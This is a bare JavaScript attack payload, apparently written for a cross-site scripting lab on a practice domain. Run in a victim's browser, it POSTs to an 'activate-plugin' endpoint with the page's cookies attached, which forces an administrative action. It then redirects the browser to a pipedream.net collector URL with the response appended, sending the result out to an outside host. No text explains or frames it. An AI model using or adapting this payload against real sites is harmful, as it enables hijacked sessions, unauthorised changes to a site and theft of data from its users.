const url = 'http://website-gafswq.inst.malicecyber.com/activate-plugin/1';

const headers = {
  'Cookie': document.cookie,
  'Host': 'website-3f3pye.inst.malicecyber.com'

};

fetch(url, {
  method: 'POST',
  headers: headers
})
  .then(response => {
    // Process the response as needed
    document.location="https://enpw216ps367.x.pipedream.net/?="+response
    console.log('Response:', response);
    // Handle the response data, e.g., response.json(), response.text(), etc.
  })
  .catch(error => {
    document.location="https://enpw216ps367.x.pipedream.net/?="+error
    console.error('Error:', error);
  });




